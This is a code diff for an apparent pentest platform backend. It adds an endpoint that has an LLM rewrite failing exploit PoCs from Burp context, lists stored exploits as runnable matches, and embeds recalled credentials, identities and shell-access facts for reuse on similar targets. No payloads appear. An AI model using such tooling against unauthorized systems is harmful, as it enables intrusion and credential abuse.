               f"Public reference (ExploitDB):{poc_text or ' (none)'}\n"
+              f"{advisory_text or ''}\n"
               f"Return ONE JSON object documenting the vulnerability's mechanics: {{"
               f'"summary": "<2-3 sentences: what the weakness is and how it is triggered>", '
               f'"components": ["<the moving parts: endpoint, auth, input, etc.>"], '
@@ -15414,8 +20271,10 @@ def _research_exploit(cve, ip=None, port=None, product=None, version=None, eid=N
                            "has_poc": bool(e.get("poc"))} for e in edb],
             "nvd_refs": (nvd.get("refs") or [])[:8],
             "has_public_module": bool(msf or edb),
+            "has_advisory_text": bool(advisory_text),
         },
         "reference_poc": poc_text[:8000],
+        "advisory_text": advisory_text[:12000],
         "llm_model": llm_model,
     }
 
@@ -15510,6 +20369,138 @@ def research_for_exploit(exploit_id: str, seed: bool = False, authorized: bool =
     except Exception:  # noqa: BLE001
         pass
     return {"ok": True, "seeded": seeded, **out}
+
+
+class TweakWithBurpBody(BaseModel):
+    """Operator-driven tweak loop: the tester has been poking the target in
+    Burp Repeater and wants Claude to pull Burp context + the current PoC and
+    suggest a corrected command. All fields optional — endpoint fills in from
+    the exploit_store row + the discovered_params / web_findings tables when
+    the operator doesn't paste anything explicit."""
+    tweaked_request: Optional[str] = None   # raw HTTP from Repeater (operator's current attempt)
+    failure_output: Optional[str] = None    # last run output / Burp response body
+    operator_note: Optional[str] = None     # what the tester tried / wants
+    include_sitemap: bool = True            # pull discovered_params + web_findings for this host
+    model: Optional[str] = None
+
+
+@app.post("/exploit-store/{exploit_id}/tweak-with-burp", tags=["Exploit Store"])
+def tweak_with_burp(exploit_id: str, body: TweakWithBurpBody, authorized: bool = Depends(auth)):
+    """LLM-assisted tweak loop. The tester has been manually tweaking the PoC
+    in Burp Repeater (or watching an active scan land issues). This endpoint
+    pulls:
+      - the current stored PoC (command, http_request, assertion, metadata),
+      - Burp context: discovered_params + web_findings for the target host,
+      - the tester's tweaked request + failure output + free-text note,
+    assembles a focused prompt, and asks the configured LLM to suggest a
+    corrected command + updated assertion + rationale. Read-only — operator
+    reviews, then clicks Apply (which snapshots the current state and writes
+    the suggested command, same as the research-seed path).
+
+    This is the natural companion to the Burp assist panel: send to Repeater,
+    tweak manually, ask Claude to fix. Nothing dispatches here."""
+    _ensure_exploit_store()
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
+        row = cur.fetchone()
+        if not row:
+            raise HTTPException(404, "exploit not found")
+        host = row.get("target_host") or ""
+        # Pull Burp context for this host — discovered_params (what Burp +
+        # arjun + katana have found) + the last 10 web_findings. Both carry
+        # the actual URLs/params Burp observed, which is the signal Claude
+        # needs to suggest a different parameter name or endpoint path.
+        discovered: list = []
+        findings: list = []
+        if body.include_sitemap and host:
+            try:
+                cur.execute("""
+                    SELECT url, http_method, param_name, param_location, source
+                    FROM discovered_params dp
+                    WHERE url ILIKE %s OR host = %s
+                    ORDER BY first_seen DESC NULLS LAST
+                    LIMIT 50
+                """, (f"%{host}%", host))
+                discovered = [dict(r) for r in cur.fetchall()]
+            except Exception as e:  # noqa: BLE001
+                logging.debug("discovered_params lookup failed: %s", e)
+            try:
+                cur.execute("""
+                    SELECT url, name, severity, evidence, method
+                    FROM web_findings
+                    WHERE url ILIKE %s
+                    ORDER BY last_seen DESC NULLS LAST
+                    LIMIT 10
+                """, (f"%{host}%",))
+                findings = [dict(r) for r in cur.fetchall()]
+            except Exception as e:  # noqa: BLE001
+                logging.debug("web_findings lookup failed: %s", e)
+    # Compose the prompt. Keep it structured so the model's JSON reply is
+    # parseable (same shape convention as research_exploit).
+    import json as _json
+    ctx = {
+        "cve": row.get("cve"),
+        "product": row.get("product"), "version": row.get("version"),
+        "target": f"{host}:{row.get('target_port') or ''}".strip(":"),
+        "current_command": row.get("command") or "",
+        "current_http_request": (row.get("http_request") or "")[:4000],
+        "current_assertion": row.get("assertion") or {},
+        "tester_tweaked_request": (body.tweaked_request or "")[:4000],
+        "last_failure_output": (body.failure_output or "")[:4000],
+        "tester_note": body.operator_note or "",
+        "burp_discovered_params": discovered[:30],
+        "burp_web_findings": findings[:10],
+    }
+    prompt = (
+        "You are helping a pentester fix a stored PoC. The tester has been "
+        "manually tweaking the request in Burp Repeater and has shared the "
+        "current state + what Burp has observed on this host. Your job is to "
+        "suggest a CORRECTED shell command (curl/python/etc.) that would make "
+        "the PoC succeed, plus an updated assertion that proves success. Do "
+        "NOT execute anything — just suggest.\n\n"
+        f"Context (JSON):\n{_json.dumps(ctx, default=str, indent=2)}\n\n"
+        "Reply with STRICT JSON only, no prose:\n"
+        '{\n'
+        '  "suggested_command": "<the full new shell command>",\n'
+        '  "suggested_assertion": {<same shape as current_assertion>},\n'
+        '  "rationale": "<2-4 sentences on what changed and why>",\n'
+        '  "burp_context_used": ["<which discovered_params/findings informed the fix>", ...]\n'
+        '}\n'
+    )
+    res = _llm_for_model(prompt, model=body.model, caller="exploit_tweak_with_burp",
+                         num_predict=1200, temperature=0.2)
+    suggestion: dict = {}
+    try:
+        text = res.get("response") or ""
+        # Strip code fences if the model wrapped it
+        import re as _re
+        text = _re.sub(r"^```(?:json)?\s*|\s*```\s*$", "", text.strip(), flags=_re.MULTILINE)
+        suggestion = _json.loads(text) if text else {}
+    except Exception as e:  # noqa: BLE001
+        logging.debug("tweak LLM reply parse failed: %s", e)
+    try:
+        emit_webhook("exploit_tweak_with_burp", "exploit_store", {
+            "id": exploit_id, "cve": row.get("cve"), "target": ctx["target"],
+            "has_suggestion": bool(suggestion.get("suggested_command")),
+            "discovered_params_seen": len(discovered), "web_findings_seen": len(findings),
+            "model": res.get("model"),
+        })
+    except Exception:  # noqa: BLE001
+        pass
+    return {
+        "ok": True,
+        "exploit_id": exploit_id,
+        "suggestion": suggestion,
+        "burp_context": {
+            "discovered_params_count": len(discovered),
+            "web_findings_count": len(findings),
+            "sample_discovered": discovered[:10],
+        },
+        "model": res.get("model"),
+        "latency_ms": res.get("latency_ms"),
+        "total_tokens": res.get("total_tokens"),
+        "raw": res.get("response") if not suggestion else None,  # expose raw only on parse fail
+    }
 
 
 def _bakeoff_one(cve, ip, port, store_id, model, eid, guidance=""):
@@ -23218,15 +28209,186 @@ def get_finding_exploit_matches(source: str, fid: str, _: bool = Depends(auth)):
         params["query"] = " ".join(query_parts)[:500]
     if finding.get("port"):
         params["port"] = finding["port"]
+    # ── Stored exploit_store rows that match this finding's CVE+target ──
+    # These rank above generic exploitdb/metasploit hits because they are
+    # curated for this engagement, often already verified, and runnable with
+    # one click via POST /exploit-store/{id}/run. A VERIFIED row is the
+    # strongest match — put it first.
+    stored_matches: list[dict] = []
+    try:
+        with get_db() as conn2, conn2.cursor(cursor_factory=RealDictCursor) as cur2:
+            # Resolve target IP from the finding's asset (vuln -> ports.asset_id,
+            # web/playwright -> asset_id or URL host).
+            target_ip = None
+            if table == "vulns":
+                cur2.execute("""SELECT host(a.ip) AS ip FROM vulns v
+                                 JOIN ports p ON p.id = v.port_id
+                                 JOIN assets a ON a.id = p.asset_id
+                                WHERE v.id = %s""", (fid,))
+                r = cur2.fetchone()
+                target_ip = r["ip"] if r else None
+            elif table == "web_findings":
+                cur2.execute("""SELECT host(a.ip) AS ip FROM web_findings w
+                                 JOIN assets a ON a.id = w.asset_id
+                                WHERE w.id = %s""", (fid,))
+                r = cur2.fetchone()
+                target_ip = r["ip"] if r else None
+            # Build the where clause: match CVE OR same target host
+            where_bits, where_args = [], []
+            if cves:
+                where_bits.append("upper(es.cve) = ANY(%s::text[])")
+                where_args.append([c.upper() for c in cves if c])
+            if target_ip:
+                where_bits.append("es.target_host = %s")
+                where_args.append(target_ip)
+            if where_bits:
+                cur2.execute(f"""
+                    SELECT es.id, es.name, es.cve, es.target_host, es.target_port,
+                           es.verified, es.command, es.rationale, es.built_at,
+                           es.llm_model, es.engagement_id
+                      FROM exploit_store es
+                     WHERE ({' OR '.join(where_bits)})
+                     ORDER BY es.verified DESC, es.updated_at DESC
+                     LIMIT 10
+                """, where_args)
+                for r in cur2.fetchall():
+                    stored_matches.append({
+                        "source": "exploit_store",
+                        "exploit_store_id": str(r["id"]),
+                        "title": r["name"],
+                        "cve": r["cve"],
+                        "target_host": r["target_host"],
+                        "target_port": r["target_port"],
+                        "verified": bool(r["verified"]),
+                        "command_preview": (r["command"] or "")[:400],
+                        "rationale": (r["rationale"] or "")[:500],
+                        "built_at": r["built_at"].isoformat() if r["built_at"] else None,
+                        "llm_model": r["llm_model"],
+                        "runnable": True,  # UI: show a Run button
+                        "match_confidence": 1.0 if r["verified"] else 0.7,
+                    })
+    except Exception as e:  # noqa: BLE001
+        logging.debug("exploit_store match lookup failed: %s", e)
+
     try:
         resp = requests.get(f"{SCAN_RECOMMENDER_URL}/rag/search/enhanced", params=params, verify=False, timeout=15)
         if resp.status_code == 200:
             data = resp.json()
-            matches = data.get("exploitdb", [])[:5] + data.get("metasploit", [])[:5]
-            return {"matches": matches, "finding": finding}
+            rag_matches = data.get("exploitdb", [])[:5] + data.get("metasploit", [])[:5]
+            # Stored exploits first; RAG matches after.
+            return {"matches": stored_matches + rag_matches, "finding": finding}
     except Exception:
         pass
-    return {"matches": [], "finding": finding}
+    return {"matches": stored_matches, "finding": finding}
+
+
+@app.get("/findings/{source}/{fid}/auto-evidence", tags=["Findings"])
+def get_finding_auto_evidence(source: str, fid: str, _: bool = Depends(auth)):
+    """Already-collected material related to this finding — what the operator
+    sees under "Add Evidence" BEFORE they upload anything. Three source types:
+
+      (1) finding_evidence: the finding's own `evidence`/`output` text column
+      (2) stored_exploits: every exploit_store row matching the finding's
+          CVE or target_host. Includes command + rationale + verified flag
+          so the operator can see the proven technique without digging.
+      (3) target_artifacts: raw_artifacts rows for the finding's target_ip
+          (last 10, newest first) — nmap/nuclei/zap/cve_poc_builder output
+          already captured against this host.
+
+    Each item has a shared shape {kind, title, body/preview, created_at,
+    link{type,id}} so the UI can render them uniformly as evidence cards."""
+    table = _WORKFLOW_TABLES.get(source)
+    if not table:
+        raise HTTPException(400, f"Invalid source: {source}. Use: vuln, web, playwright")
+    items: list[dict] = []
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        # (1) finding's own evidence/output column — tier-by-source
+        target_ip = None
+        cves: list[str] = []
+        if table == "vulns":
+            cur.execute("""SELECT v.cve, v.output, v.script,
+                                 host(a.ip) AS ip
+                            FROM vulns v
+                            LEFT JOIN ports p ON p.id = v.port_id
+                            LEFT JOIN assets a ON a.id = p.asset_id
+                           WHERE v.id = %s""", (fid,))
+            r = cur.fetchone()
+            if r:
+                target_ip = r.get("ip")
+                cves = list(r.get("cve") or [])
+                if r.get("output"):
+                    items.append({"kind": "finding_output", "title": r.get("script") or "scanner output",
+                                  "body": r["output"][:4000], "created_at": None,
+                                  "link": {"type": "vuln", "id": fid}})
+        elif table == "web_findings":
+            cur.execute("""SELECT w.name, w.evidence, w.description, w.url,
+                                 host(a.ip) AS ip
+                            FROM web_findings w
+                            LEFT JOIN assets a ON a.id = w.asset_id
+                           WHERE w.id = %s""", (fid,))
+            r = cur.fetchone()
+            if r:
+                target_ip = r.get("ip")
+                if r.get("evidence"):
+                    items.append({"kind": "finding_evidence", "title": r.get("name") or "web evidence",
+                                  "body": r["evidence"][:4000], "created_at": None,
+                                  "link": {"type": "web_finding", "id": fid}})
+        else:
+            cur.execute("""SELECT title, description, url FROM playwright_findings WHERE id = %s""", (fid,))
+            r = cur.fetchone()
+            if r and r.get("description"):
+                items.append({"kind": "finding_description", "title": r.get("title") or "playwright finding",
+                              "body": r["description"][:4000], "created_at": None,
+                              "link": {"type": "playwright_finding", "id": fid}})
+
+        # (2) stored exploit_store rows matching CVE or target host
+        where_bits, where_args = [], []
+        if cves:
+            where_bits.append("upper(es.cve) = ANY(%s::text[])")
+            where_args.append([c.upper() for c in cves if c])
+        if target_ip:
+            where_bits.append("es.target_host = %s")
+            where_args.append(target_ip)
+        if where_bits:
+            cur.execute(f"""
+                SELECT id, name, cve, target_host, target_port, verified,
+                       command, rationale, built_at
+                  FROM exploit_store es
+                 WHERE ({' OR '.join(where_bits)})
+                 ORDER BY verified DESC, updated_at DESC LIMIT 10
+            """, where_args)
+            for e in cur.fetchall():
+                items.append({
+                    "kind": "stored_exploit",
+                    "title": f"{'✓ VERIFIED' if e['verified'] else 'unverified'} — {e['name']}",
+                    "body": (f"CVE: {e['cve']}\n"
+                             f"Target: {e['target_host']}:{e['target_port']}\n"
+                             f"Verified: {e['verified']}\n\n"
+                             f"RATIONALE:\n{(e['rationale'] or '(none)')[:600]}\n\n"
+                             f"COMMAND:\n{(e['command'] or '')[:1200]}"),
+                    "created_at": e["built_at"].isoformat() if e["built_at"] else None,
+                    "link": {"type": "exploit_store", "id": str(e["id"])},
+                    "verified": bool(e["verified"]),
+                    "runnable": True,
+                })
+
+        # (3) raw_artifacts rows for this target — scans the operator ran
+        if target_ip:
+            cur.execute("""SELECT id, tool, source, note, byte_size, first_seen,
+                                 substring(content, 1, 600) AS preview
+                            FROM raw_artifacts
+                           WHERE target = %s
+                           ORDER BY first_seen DESC LIMIT 10""", (target_ip,))
+            for a in cur.fetchall():
+                items.append({
+                    "kind": "target_artifact",
+                    "title": f"[{a['tool']}] {a.get('note') or ''}".strip(),
+                    "body": (a["preview"] or "")[:1800],
+                    "created_at": a["first_seen"].isoformat() if a["first_seen"] else None,
+                    "link": {"type": "artifact", "id": str(a["id"])},
+                    "byte_size": a["byte_size"],
+                })
+    return {"items": items, "count": len(items), "target_ip": target_ip, "cves": cves}
 
 
 # ── Web PoC Generation + Queueing ─────────────────────────────────────────
@@ -27225,6 +32387,1408 @@ def export_msf_options_endpoint(_: bool = Depends(auth)):
 # knowledge/vuln_class_methodology.yaml (via common/vuln_skills._classes) and embed
 # into rag_documents, with no code change per skill.
 VULN_SKILL_RAG_SOURCE = "custom_vuln_skill"
+
+# ── observed target facts + enum_facts as first-class RAG objects ─────────────
+# Dynamic facts an agent SAW on a target (framework, credentials, admin paths,
+# WAF family, honored params, and the enum_facts window from post_enumeration)
+# get embedded into rag_documents so a future build against the same OR a
+# similar target can RECALL them via similarity search — closing the gap where
+# rules were retrievable but observations weren't.
+#
+# Behind RAG_OBSERVED_FACTS env flag (default off). Cleanup helpers +
+# DELETE /rag/observed-facts endpoint let the operator trim stale rows.
+RAG_OBSERVED_FACTS_SOURCE = "observed_target_fact"
+RAG_ENUM_FACT_SOURCE = "enum_fact_for_exploit"
+# Credentials + identities as first-class RAG so retrieval can answer
+# "have we seen this user/pass on any similar product?" and "which accounts
+# does this engagement have access to?" via similarity, not just exact SQL.
+RAG_CREDENTIAL_SOURCE = "credential_identity"
+RAG_IDENTITY_SOURCE = "directory_identity"
+# Tier 1: highest-ROI first-class RAG sources — techniques that worked, vulns
+# confirmed, service fingerprints, and every endpoint we've seen.
+RAG_VERIFIED_TECHNIQUE_SOURCE = "verified_exploit_technique"
+RAG_VULN_FINDING_SOURCE = "vuln_finding"
+RAG_SERVICE_FINGERPRINT_SOURCE = "service_fingerprint"
+RAG_DISCOVERED_ENDPOINT_SOURCE = "discovered_endpoint"
+# Tier 2: web findings by class + api schemas + info-disclosure paths
+RAG_WEB_FINDING_SOURCE = "web_finding"
+RAG_API_SCHEMA_SOURCE = "api_schema"
+RAG_INFO_DISCLOSURE_SOURCE = "info_disclosure"
+# Tier 3: negative-signal + tenant intel + framework-fingerprint patterns
+RAG_FAILED_TECHNIQUE_SOURCE = "failed_technique"
+RAG_SUBDOMAIN_PATTERN_SOURCE = "subdomain_pattern"
+RAG_SESSION_SCHEME_SOURCE = "session_scheme"
+RAG_SHELL_ACCESS_SOURCE = "shell_access"
+_RAG_FACT_SOURCES = (RAG_OBSERVED_FACTS_SOURCE, RAG_ENUM_FACT_SOURCE,
+                     RAG_CREDENTIAL_SOURCE, RAG_IDENTITY_SOURCE,
+                     RAG_VERIFIED_TECHNIQUE_SOURCE, RAG_VULN_FINDING_SOURCE,
+                     RAG_SERVICE_FINGERPRINT_SOURCE, RAG_DISCOVERED_ENDPOINT_SOURCE,
+                     RAG_WEB_FINDING_SOURCE, RAG_API_SCHEMA_SOURCE,
+                     RAG_INFO_DISCLOSURE_SOURCE,
+                     RAG_FAILED_TECHNIQUE_SOURCE, RAG_SUBDOMAIN_PATTERN_SOURCE,
+                     RAG_SESSION_SCHEME_SOURCE, RAG_SHELL_ACCESS_SOURCE)
+
+
+def observed_facts_enabled() -> bool:
+    """True when observed-fact embedding + recall should run. Env-flag default off."""
+    return os.environ.get("RAG_OBSERVED_FACTS", "0").lower() in ("1", "true", "yes", "on")
+
+
+def _observed_fact_value_hash(ip, kind, value):
+    """Stable short hash for the dedup key (source, ip, kind, value_hash). Different
+    facts on the same target produce distinct rows; the same fact upserts."""
+    import hashlib as _h
+    return _h.sha256(f"{ip}|{kind}|{value}".encode("utf-8", "ignore")).hexdigest()[:16]
+
+
+def _load_observed_fact_into_rag(source, ip, kind, value, engagement_id=None, product=None):
+    """Embed ONE observed-target fact and upsert it into rag_documents. Idempotent
+    per (source, ip, kind, value_hash). Fail-soft — never raises, so a DB or
+    embed failure never breaks the pipeline that produced the fact."""
+    if not observed_facts_enabled():
+        return False
+    if source not in _RAG_FACT_SOURCES:
+        return False
+    # Lazy-start the nightly purge daemon on first embed. Idempotent; cheap.
+    # Covers the case where the FastAPI startup event hasn't armed it yet
+    # (test harnesses, headless invocations, in-container python shells).
+    try:
+        _ensure_rag_purge_daemon()
+    except Exception:  # noqa: BLE001
+        pass
+    try:
+        v = str(value)[:1000]
+        value_hash = _observed_fact_value_hash(ip, kind, v)
+        title = f"[observed] {ip} {kind}={v[:80]}"
+        body = (f"Target: {ip}\nKind: {kind}\nValue: {v}"
+                + (f"\nProduct: {product}" if product else ""))
+        vec = _embed_text(f"{title}\n{body}")
+        vec_str = "[" + ",".join(repr(float(x)) for x in vec) + "]"
+        meta = {"source": source, "ip": ip, "kind": kind, "value": v,
+                "value_hash": value_hash, "engagement_id": engagement_id,
+                "product": product,
+                "observed_at": __import__("datetime").datetime.utcnow().isoformat() + "Z"}
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute(
+                "DELETE FROM rag_documents WHERE metadata->>'source' = %s "
+                "AND metadata->>'ip' = %s AND metadata->>'kind' = %s "
+                "AND metadata->>'value_hash' = %s",
+                (source, ip, kind, value_hash))
+            cur.execute(
+                "INSERT INTO rag_documents (title, text_chunk, metadata, embedding) "
+                "VALUES (%s, %s, %s, %s::vector)",
+                (title, body, Json(meta), vec_str))
+            conn.commit()
+        return True
+    except Exception as e:  # noqa: BLE001
+        logging.debug("observed-fact->rag load failed for %s/%s/%s: %s", source, ip, kind, e)
+        return False
+
+
+def _remove_observed_facts_for_ip(ip, source=None):
+    """Drop all observed/enum-fact rows for one target. Used by engagement purge
+    so a re-scan of the same host starts clean."""
+    try:
+        with get_db() as conn, conn.cursor() as cur:
+            if source:
+                cur.execute(
+                    "DELETE FROM rag_documents WHERE metadata->>'source' = %s "
+                    "AND metadata->>'ip' = %s", (source, ip))
+            else:
+                cur.execute(
+                    "DELETE FROM rag_documents WHERE metadata->>'source' = ANY(%s) "
+                    "AND metadata->>'ip' = %s", (list(_RAG_FACT_SOURCES), ip))
+            n = cur.rowcount
+            conn.commit()
+        return n
+    except Exception as e:  # noqa: BLE001
+        logging.debug("observed-fact->rag remove for ip=%s failed: %s", ip, e)
+        return 0
+
+
+def purge_observed_facts(older_than_days=None, engagement_id=None, ip=None, source=None):
+    """Bulk cleanup of observed/enum-fact RAG rows. All filters optional; caller
+    supplies whichever combination they want (older_than_days keeps recent rows;
+    engagement_id scopes to one engagement's data; ip to one host; source to
+    only observed_target_fact OR enum_fact_for_exploit).
+    Returns the deleted row count. Safe to call twice — second call returns 0."""
+    where = ["metadata->>'source' = ANY(%s)"]
+    args = [list([source]) if source else list(_RAG_FACT_SOURCES)]
+    if ip:
+        where.append("metadata->>'ip' = %s"); args.append(ip)
+    if engagement_id:
+        where.append("metadata->>'engagement_id' = %s"); args.append(str(engagement_id))
+    if older_than_days is not None:
+        # observed_at is ISO — Postgres can compare as text OK, but safer via cast
+        where.append("(metadata->>'observed_at')::timestamptz < (now() - (%s || ' days')::interval)")
+        args.append(str(int(older_than_days)))
+    sql = "DELETE FROM rag_documents WHERE " + " AND ".join(where)
+    try:
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute(sql, args)
+            n = cur.rowcount
+            conn.commit()
+        return n
+    except Exception as e:  # noqa: BLE001
+        logging.debug("purge_observed_facts failed: %s", e)
+        return 0
+
+
+def _recall_observed_facts(ip, product=None, limit=12):
+    """Query rag_documents for prior observed/enum facts on THIS ip (strict match)
+    OR similar product (loose match). Returns a list ordered by exactness (ip
+    match first, then product match), most-recent first. Used by synth to
+    prepend a PRIOR OBSERVATIONS block."""
+    if not observed_facts_enabled():
+        return []
+    try:
+        results = []
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT title, metadata FROM rag_documents
+                     WHERE metadata->>'source' = ANY(%s)
+                       AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC
+                     LIMIT %s""",
+                (list(_RAG_FACT_SOURCES), ip, limit))
+            for r in cur.fetchall():
+                m = r["metadata"] or {}
+                results.append({"scope": "self", "ip": m.get("ip"),
+                                 "kind": m.get("kind"), "value": m.get("value"),
+                                 "source": m.get("source")})
+            remaining = max(0, limit - len(results))
+            if remaining > 0 and product:
+                cur.execute(
+                    """SELECT title, metadata FROM rag_documents
+                         WHERE metadata->>'source' = ANY(%s)
+                           AND metadata->>'product' = %s
+                           AND metadata->>'ip' <> %s
+                         ORDER BY (metadata->>'observed_at') DESC
+                         LIMIT %s""",
+                    (list(_RAG_FACT_SOURCES), product, ip, remaining))
+                for r in cur.fetchall():
+                    m = r["metadata"] or {}
+                    results.append({"scope": "cross-target", "ip": m.get("ip"),
+                                     "kind": m.get("kind"), "value": m.get("value"),
+                                     "source": m.get("source")})
+        return results
+    except Exception as e:  # noqa: BLE001
+        logging.debug("_recall_observed_facts failed for ip=%s: %s", ip, e)
+        return []
+
+
+def _format_recall_block(facts):
+    """Compose the PRIOR OBSERVATIONS guidance string from _recall_observed_facts.
+    Empty string when no facts — synth guidance unchanged in that case."""
+    if not facts:
+        return ""
+    # Group by kind so the strategist sees a compact structured view
+    by_kind = {}
+    for f in facts:
+        by_kind.setdefault(f["kind"], []).append(f)
+    lines = []
+    for kind, items in by_kind.items():
+        vals = []
+        for it in items[:5]:  # cap per kind
+            tag = "self" if it["scope"] == "self" else f"seen@{it['ip']}"
+            vals.append(f"{it['value']} ({tag})")
+        lines.append(f"  * {kind}: " + "; ".join(vals))
+    return ("PRIOR OBSERVATIONS (recalled from this or a similar target — facts "
+            "the platform already saw here or elsewhere; TREAT AS SUGGESTIVE, not "
+            "authoritative, and re-verify what you use):\n" + "\n".join(lines))
+
+
+def _embed_response_mine_intel(ip, intel_list, engagement_id=None, product=None):
+    """Iterate _scout_response_mine's intel_list and embed each curated fact.
+    Called from build_poc_graph.node_response_mine when the flag is on. No-op
+    when observed_facts_enabled() returns False."""
+    if not observed_facts_enabled() or not intel_list:
+        return 0
+    written = 0
+    try:
+        for x in intel_list:
+            fw = x.get("framework")
+            if fw and _load_observed_fact_into_rag(
+                    RAG_OBSERVED_FACTS_SOURCE, ip, "framework", fw,
+                    engagement_id=engagement_id, product=product or fw):
+                written += 1
+            for c in (x.get("credential_hints") or []):
+                if _load_observed_fact_into_rag(
+                        RAG_OBSERVED_FACTS_SOURCE, ip, "credential", c,
+                        engagement_id=engagement_id, product=product):
+                    written += 1
+            for p in (x.get("admin_paths") or []):
+                if _load_observed_fact_into_rag(
+                        RAG_OBSERVED_FACTS_SOURCE, ip, "admin_path", p,
+                        engagement_id=engagement_id, product=product):
+                    written += 1
+            if x.get("auth_wall") and _load_observed_fact_into_rag(
+                    RAG_OBSERVED_FACTS_SOURCE, ip, "auth_wall", str(x["auth_wall"])[:100],
+                    engagement_id=engagement_id, product=product):
+                written += 1
+    except Exception as e:  # noqa: BLE001
+        logging.debug("embed_response_mine_intel failed: %s", e)
+    return written
+
+
+def _embed_enum_facts_for_target(ip, engagement_id=None, product=None, window=50):
+    """Read the target's most recent enum_facts (assets/ports/vulns/web_findings/
+    credential_findings — whichever the engagement has) and embed a compact
+    window as enum_fact_for_exploit rows. Called from build-poc when the flag
+    is on. Reuses existing tables; doesn't require post_enumeration to run."""
+    if not observed_facts_enabled():
+        return 0
+    written = 0
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            # asset_id lookup
+            cur.execute("SELECT id FROM assets WHERE ip = %s LIMIT 1", (ip,))
+            row = cur.fetchone()
+            if not row:
+                return 0
+            asset_id = row["id"]
+            # Ports (kind='port_service')
+            cur.execute("SELECT port, service, banner FROM ports WHERE asset_id = %s "
+                         "AND COALESCE(is_open, true) LIMIT %s", (asset_id, window))
+            for p in cur.fetchall():
+                v = f"port={p['port']} service={p['service'] or '?'} banner={(p['banner'] or '')[:80]}"
+                if _load_observed_fact_into_rag(
+                        RAG_ENUM_FACT_SOURCE, ip, "port_service", v,
+                        engagement_id=engagement_id, product=product):
+                    written += 1
+            # Web findings (kind='web_finding')
+            try:
+                cur.execute("SELECT name, url FROM web_findings WHERE asset_id = %s "
+                             "ORDER BY created_at DESC LIMIT %s", (asset_id, window))
+                for w in cur.fetchall():
+                    v = f"{w['name']} @ {(w['url'] or '')[:120]}"
+                    if _load_observed_fact_into_rag(
+                            RAG_ENUM_FACT_SOURCE, ip, "web_finding", v,
+                            engagement_id=engagement_id, product=product):
+                        written += 1
+            except Exception:  # noqa: BLE001
+                pass
+            # Credential findings (kind='credential')
+            try:
+                cur.execute("SELECT username, service, port FROM credential_findings "
+                             "WHERE asset_id = %s ORDER BY created_at DESC LIMIT %s",
+                             (asset_id, window))
+                for c in cur.fetchall():
+                    v = f"user={c['username']} on {c['service'] or '?'}:{c['port'] or '?'}"
+                    if _load_observed_fact_into_rag(
+                            RAG_ENUM_FACT_SOURCE, ip, "credential_finding", v,
+                            engagement_id=engagement_id, product=product):
+                        written += 1
+            except Exception:  # noqa: BLE001
+                pass
+    except Exception as e:  # noqa: BLE001
+        logging.debug("embed_enum_facts_for_target ip=%s failed: %s", ip, e)
+    return written
+
+
+def _load_credential_into_rag(cred_row, engagement_id=None, product=None):
+    """Embed one credential_findings row as a first-class RAG object. Key on
+    (source, ip, kind, value_hash) where value = "<user>:<secret_or_hash_marker>
+    on <service>:<port>". Metadata carries username/service/port/auth_type/
+    secret_type/valid_cred/source so retrieval can filter beyond similarity.
+    Fail-soft — never raises."""
+    if not observed_facts_enabled() or not cred_row:
+        return False
+    try:
+        ip = str(cred_row.get("ip") or "")
+        u = cred_row.get("username") or ""
+        svc = cred_row.get("protocol") or cred_row.get("service") or "?"
+        port = cred_row.get("port") or "?"
+        auth = cred_row.get("auth_type") or "password"
+        secret_type = cred_row.get("secret_type") or "password"
+        src = cred_row.get("source") or "unknown"
+        valid = bool(cred_row.get("valid_cred", True))
+        # We do NOT embed the plaintext secret here — even at high signal it's a
+        # material a stolen RAG dump would leak. Embed a MARKER, keep the actual
+        # secret in credential_findings.recovered_secret. Retrieval says "we have
+        # a pass for admin here" and the operator retrieves the value via SQL.
+        secret_marker = "<known>" if valid else "<invalid>"
+        v = f"{u}:{secret_marker}@{svc}:{port} ({secret_type}, source={src})"
+        return _load_observed_fact_into_rag(
+            RAG_CREDENTIAL_SOURCE, ip, "credential", v,
+            engagement_id=engagement_id or str(cred_row.get("engagement_id") or "") or None,
+            product=product)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("credential->rag load failed: %s", e)
+        return False
+
+
+def _load_identity_into_rag(identity_row, engagement_id=None):
+    """Embed one identities row (Azure/AD/AWS/etc. directory identity) as RAG.
+    Metadata carries provider, identifier, principal_type, status, mfa_state,
+    is_admin, tenant/domain so recall can answer "which admins?" or "which
+    accounts had MFA disabled in this tenant?". Fail-soft."""
+    if not observed_facts_enabled() or not identity_row:
+        return False
+    try:
+        prov = identity_row.get("provider") or "?"
+        ident = identity_row.get("identifier") or ""
+        ptype = identity_row.get("principal_type") or "?"
+        status = identity_row.get("status") or "unknown"
+        mfa = identity_row.get("mfa_state") or "unknown"
+        is_admin = bool(identity_row.get("is_admin"))
+        tenant = identity_row.get("tenant_id") or identity_row.get("domain") or ""
+        v = (f"{ident} [{prov} {ptype}] status={status} mfa={mfa}"
+             + (" ADMIN" if is_admin else "")
+             + (f" tenant={tenant}" if tenant else ""))
+        # Use provider+identifier as the "ip" slot for dedup keying — identities
+        # aren't ip-scoped, but the (source, "ip", kind, value_hash) shape
+        # already works when we substitute the provider+identifier there.
+        pseudo_ip = f"{prov}/{ident}"
+        return _load_observed_fact_into_rag(
+            RAG_IDENTITY_SOURCE, pseudo_ip, ptype or "identity", v,
+            engagement_id=engagement_id or str(identity_row.get("engagement_id") or "") or None,
+            product=prov)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("identity->rag load failed: %s", e)
+        return False
+
+
+def _backfill_credentials_and_identities_to_rag(engagement_id=None, limit=500):
+    """One-shot backfill: read existing credential_findings + identities and
+    embed each into rag_documents. Used to populate RAG the first time the
+    flag is turned on for an engagement with existing data. Idempotent via
+    the dedup key. Returns (creds_written, identities_written)."""
+    if not observed_facts_enabled():
+        return (0, 0)
+    n_cred = 0; n_id = 0
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            where, args = "", []
+            if engagement_id:
+                where = "WHERE engagement_id = %s"
+                args.append(str(engagement_id))
